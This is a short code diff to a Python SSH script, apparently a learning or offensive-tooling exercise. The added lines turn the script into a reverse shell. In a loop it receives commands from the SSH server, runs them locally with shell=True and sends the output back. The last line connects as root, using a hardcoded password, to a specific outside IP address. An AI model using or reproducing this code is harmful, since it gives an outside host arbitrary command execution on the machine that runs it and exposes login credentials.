@@ -17,7 +17,19 @@ def ssh_command(ip, user, password, command):
     if ssh_session.active:
         ssh_session.exec_command(command)
         print(ssh_session.recv(1024))
+        while True:
+            command = ssh_session.recv(1024)
+            # get the command from the SSH server
+            try:
+                cmd_output = subprocess.check_output(command, shell=True)
+                ssh_session.send(cmd_output)
+            except Exception as e:
+                ssh_session.send(str(e))
+        client.close()
+
+    return
+
     return
 
 
-ssh_command('139.199.21.130', 'root', 'gj5846gj..', 'id')
+ssh_command('139.199.21.130', 'root', 'gj5846gj..', 'ClientConnected')
